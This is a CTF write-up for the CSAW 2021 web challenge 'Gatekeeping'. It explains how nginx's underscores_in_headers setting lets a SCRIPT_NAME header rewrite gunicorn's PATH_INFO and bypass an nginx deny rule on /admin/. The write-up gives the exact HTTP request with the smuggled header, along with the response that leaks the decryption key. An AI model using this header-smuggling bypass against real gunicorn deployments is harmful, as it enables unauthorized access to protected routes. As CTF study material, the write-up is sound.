---
layout: post
title: "Gatekeeping (Web 395) csaw21 writeup"
categories: ctf web gunicorn path_info nginx
---

## Gatekeeping (Web 395) CSAW21 writeup

At csaw 2021 we had an interesting task "Gatekeeping" created by itszn.

## Description

The task consisted of a website that imitated a ransomware site to decrypt your files after paying a ransom. We were given the code for the challenge in the form of a Docker container. The container had the server code, an encrypted file, and the server nginx config. The webserver was written in flask with the following code:

```python
import os
import json
import string
import binascii

from flask import Flask, Blueprint, request, jsonify, render_template, abort
from Crypto.Cipher import AES

app = Flask(__name__)

def get_info():
    key = request.headers.get('key_id')
    if not key:
        abort(400, 'Missing key id')
    if not all(c in '0123456789ABCDEFabcdef'
            for c in key):
        abort(400, 'Invalid key id format')
    path = os.path.join('/server/keys',key)
    if not os.path.exists(path):
        abort(401, 'Unknown encryption key id')
    with open(path,'r') as f:
        return json.load(f)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/decrypt', methods=['POST'])
def decrypt():
    info = get_info()
    if not info.get('paid', False):
        abort(403, 'Ransom has not been paid')

    key = binascii.unhexlify(info['key'])
    data = request.get_data()
    iv = data[:AES.block_size]

    data = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CFB, iv)

    return cipher.decrypt(data)

# === CL Review Comments - 5a7b3f
# <Alex> Is this safe?
# <Brad> Yes, because we have `deny all` in nginx.
# <Alex> Are you sure there won't be any way to get around it?
# <Brad> Here, I wrote a better description in the nginx config, hopefully that will help
# <Brad> Plus we had our code audited after they stole our coins last time
# <Alex> What about dependencies?
# <Brad> You are over thinking it. no one is going to be looking. everyone we encrypt is so bad at security they would never be able to find a bug in a library like that
# ===
@app.route('/admin/key')
def get_key():
    return jsonify(key=get_info()['key'])

```

This code refers to the nginx config, which was also given:
nginx:

```nginx
server {
    listen 80;

    underscores_in_headers on;

    location / {
        include proxy_params;

        # Nginx uses the WSGI protocol to transmit the request to gunicorn through the domain socket 
        # We do this so the network can't connect to gunicorn directly, only though nginx
        proxy_pass http://unix:/tmp/gunicorn.sock;
        proxy_pass_request_headers on;

        # INFO(brad)
        # Thought I would explain this to clear it up:
        # When we make a request, nginx forwards the request to gunicorn.
        # Gunicorn then reads the request and calculates the path (which is put into the WSGI variable `path_info`)
        #
        # We can prevent nginx from forwarding any request starting with "/admin/". If we do this 
        # there is no way for gunicorn to send flask a `path_info` which starts with "/admin/"
        # Thus any flask route starting with /admin/ should be safe :)
        location ^~ /admin/ {
            deny all;
        }
    }
}
```

It seems like the challenge is to access the route `/admin/key` even though it is clearly blocked in the nginx config. This route should let us retrieve the key that we need to decrypt our encrypted file which contains the flag. Reading through the comments in the task, we see that `path_info` is mentioned, which is the environment variable that is used internally by the wsgi service to identify which path was requested. So if we can set this to `/admin/key` after passing through the nginx filter, we win.

### Failed attempts

attempting naive attacks using requests such as `GET /asd/../admin/key HTTP/1.1` does not work, they are successfully blocked by nginx.

### Solution

Looking through the nginx config, the line `underscores_in_headers on;` seems suspicious. Googling for this, and the 'path_info' mentioned in the comments, we find this blogpost: https://github.security.telekom.com/2020/05/smuggling-http-headers-through-reverse-proxies.html . Furthermore, reading through [nginx pitfalls](https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/), we find the following very interesting quote:

> If you do not explicitly set underscores_in_headers on;, NGINX will silently drop HTTP headers with underscores (which are perfectly valid according to the HTTP standard). This is done in order to prevent ambiguities when mapping headers to CGI variables as both dashes and underscores are mapped to underscores during that process.

To look at the headers that the server receives, we can modify it in a local installation as follows:

```python
@app.route('/test')
def get_key2():
    return jsonify(key=get_info()['key'])


@app.route('/asdf')
def asdf():
    headers = [f"{k}:{v}" for k,v in request.headers]
    header_str = '\n'.join(headers)

    env_st = str(request.environ)

    return f"{header_str}\n{env_st}\n\nend"
```

accessing `/asdf`, we can now see the environment and the headers. The environment is specifically interesting:

```python
{'wsgi.errors': <gunicorn.http.wsgi.WSGIErrorsWrapper object at 0xffffa5c66be0>, 'wsgi.version': (1, 0), 'wsgi.multithread': False, 'wsgi.multiprocess': True, 'wsgi.run_once': False, 'wsgi.file_wrapper': <class 'gunicorn.http.wsgi.FileWrapper'>, 'wsgi.input_terminated': True, 'SERVER_SOFTWARE': 'gunicorn/20.1.0', 'wsgi.input': <gunicorn.http.body.Body object at 0xffffa5c66bb0>, 'gunicorn.socket': <socket.socket fd=9, family=AddressFamily.AF_UNIX, type=SocketKind.SOCK_STREAM, proto=0, laddr=/tmp/gunicorn.sock>, 'REQUEST_METHOD': 'GET', 'QUERY_STRING': '', 'RAW_URI': '/asdf', 'SERVER_PROTOCOL': 'HTTP/1.0', 'HTTP_HOST': '127.0.0.1', 'HTTP_X_REAL_IP': '172.17.0.1', 'HTTP_X_FORWARDED_FOR': '172.17.0.1', 'HTTP_X_FORWARDED_PROTO': 'http', 'HTTP_CONNECTION': 'close', 'HTTP_USER_AGENT': 'redacted', 'HTTP_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'HTTP_ACCEPT_LANGUAGE': 'de,en-US;q=0.7,en;q=0.3', 'HTTP_ACCEPT_ENCODING': 'gzip, deflate', 'HTTP_UPGRADE_INSECURE_REQUESTS': '1', 'HTTP_SEC_FETCH_DEST': 'document', 'HTTP_SEC_FETCH_MODE': 'navigate', 'HTTP_SEC_FETCH_SITE': 'none', 'HTTP_SEC_FETCH_USER': '?1', 'HTTP_CACHE_CONTROL': 'max-age=0', 'HTTP_PATH_INFO': '/asdf', 'wsgi.url_scheme': 'http', 'REMOTE_ADDR': '', 'SERVER_NAME': '127.0.0.1', 'SERVER_PORT': '80', 'PATH_INFO': '/asdf', 'SCRIPT_NAME': '', 'werkzeug.request': <Request 'http://127.0.0.1/asdf' [GET]>}
```

We can see that when we send a header such as 'PATH_INFO', which I had done in this example, it will get translated internally to 'HTTP_PATH_INFO' Furthermore, when we look at the parsed headers, we will see that actually it will be then translated to 'PATH-INFO' with a dash. To investigate, I decided to check out the gunicorn implementation that is responsible for this. [In there](https://github.com/benoitc/gunicorn/blob/master/gunicorn/http/wsgi.py#L182), I then found the following snippet:

```python
#https://github.com/benoitc/gunicorn/blob/master/gunicorn/http/wsgi.py#L182
    if script_name:
        path_info = path_info.split(script_name, 1)[1]
```

This means, if we call the site with the path `/lol/asdf/admin/key`, and set the Header `SCRIPT_NAME: /asdf`, the path will be split into `['/lol','/admin/key']`, of which the second entry will be set as `path_info`, granting us access to the key! You might have noticed that we need a `key_id` to retrieve the correct key, but we can get this trivially by intercepting the request on the legitimate webserver when we try to get our encrypted file decrypted.

With some more requests we can get the flag:

```http
GET /lol/asdf/admin/key HTTP/1.1
Host: web.chal.csaw.io:5004
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
key_id: 05d1dc92ce82cc09d9d7ff1ac9d5611d
SCRIPT_NAME: /asdf
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```


-->
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Fri, 10 Sep 2021 23:46:27 GMT
Content-Type: application/json
Content-Length: 75
Connection: close

{"key":"b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3"}
```

then change the local server decryption endpoint:

```python
# [...]
@app.route('/decrypt', methods=['POST'])
def decrypt():
    # info = get_info()
    # if not info.get('paid', False):
    #     abort(403, 'Ransom has not been paid')
    info = {"key": "b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3"}

    key = binascii.unhexlify(info['key'])
    data = request.get_data()
    iv = data[:AES.block_size]

    data = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CFB, iv)

    return cipher.decrypt(data)

# [...]

```
and get the flag.


## TLDR:

Sending the `SCRIPT_NAME: Z` header to a gunicorn server on a path `/abcZdef`, will result in the path `def` being requested.




[@r0bre](https://twitter.com/r0bre), 13.09.2021
